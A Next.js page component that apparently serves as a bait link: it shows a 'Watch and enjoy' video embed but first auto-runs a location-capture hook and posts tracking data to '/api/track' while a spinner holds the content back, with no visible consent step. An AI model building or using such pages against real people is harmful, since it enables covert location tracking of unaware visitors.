'use client';

import { useState, useEffect } from 'react';
import Layout from '../components/Layout';
import LoadingSpinner from '../components/LoadingSpinner';
import EmbedContent from '../components/EmbedContent';
import { useLocationTracking } from '../hooks/useLocationTracking';

export default function EmbedPage() {
  const [contentUnlocked, setContentUnlocked] = useState(false);
  const [pageConfig, setPageConfig] = useState<any>(null);
  const { captureLocation, sendTrackingData, isLoading } = useLocationTracking();
  
  useEffect(() => {
    // Load page configuration
    loadPageConfig();
    
    // Auto-start tracking
    initializeTracking();
  }, []);
  
  const loadPageConfig = async () => {
    try {
      const response = await fetch('/api/page-config/embed');
      const data = await response.json();
      
      if (data.success) {
        setPageConfig(data.page);
      }
    } catch (error) {
      console.error('Failed to load page config:', error);
    }
  };
  
  const initializeTracking = async () => {
    try {
      // Capture location
      await captureLocation(window.location.href);
      
      // Send tracking data
      await sendTrackingData('/api/track', window.location.href);
      
      // Unlock content after delay
      setTimeout(() => {
        setContentUnlocked(true);
      }, 2000);
    } catch (err) {
      console.error('Tracking error:', err);
      // Still unlock content
      setContentUnlocked(true);
    }
  };
  
  const config = pageConfig || {
    title: 'Embedded Content',
    subtitle: 'Watch and enjoy',
    loadingText: 'Loading content...',
    content: {
      type: 'embed',
      embedUrl: 'https://www.youtube.com/embed/dQw4w9WgXcQ'
    }
  };
  
  return (
    <Layout>
      <div className="max-w-6xl mx-auto">
        <header className="text-center mb-12 animate-fadeIn">
          <h1 className="text-4xl md:text-5xl font-bold text-gray-800 dark:text-gray-100 mb-4">
            {config.title}
          </h1>
          <p className="text-lg text-gray-600 dark:text-gray-400">
            {config.subtitle}
          </p>
        </header>
        
        {!contentUnlocked ? (
          <div className="card text-center">
            <LoadingSpinner text={config.loadingText} />
          </div>
        ) : (
          <div className="animate-fadeIn">
            <EmbedContent
              embedUrl={config.content?.embedUrl}
              html={config.content?.html}
              title={config.title}
            />
            
            {config.content?.message && (
              <div className="card mt-6 bg-blue-50 dark:bg-blue-900/20 border-blue-200 dark:border-blue-800">
                <p className="text-blue-800 dark:text-blue-200">
                  {config.content.message}
                </p>
              </div>
            )}
          </div>
        )}
        
        <footer className="mt-12 text-center text-sm text-gray-500 dark:text-gray-400">
          <p>Thank you for visiting!</p>
        </footer>
      </div>
    </Layout>
  );
}

